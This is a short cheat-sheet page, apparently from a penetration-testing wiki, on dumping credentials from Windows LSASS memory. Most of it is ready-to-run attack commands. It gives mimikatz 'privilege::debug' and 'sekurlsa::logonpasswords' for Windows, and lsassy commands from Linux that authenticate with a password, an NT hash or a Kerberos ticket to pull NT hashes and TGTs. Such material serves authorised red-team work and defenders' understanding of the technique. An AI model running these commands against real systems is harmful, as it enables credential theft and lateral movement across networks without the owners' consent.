---
label: LSASS Memory
---

# Credentials dump LSASS memory

> **Requirements:**
>
> - You have to be a local administrator on the machine (or SYSTEM).

LSASS dump can reveal credentials of users currently or recently logged into the system. The most common cached credentials will be NT hashes and Kerberos TGTs.

{/*TODO: sekurlsa::ekeys*/}

Windows:

```powershell
.\mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords
```

Linux:

```bash
# Using password
lsassy -u $user -p $password -d $domain $host

# Using NT hash
lsassy -u $user -H $nt_hash -d $domain $host

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
lsassy -k $host
```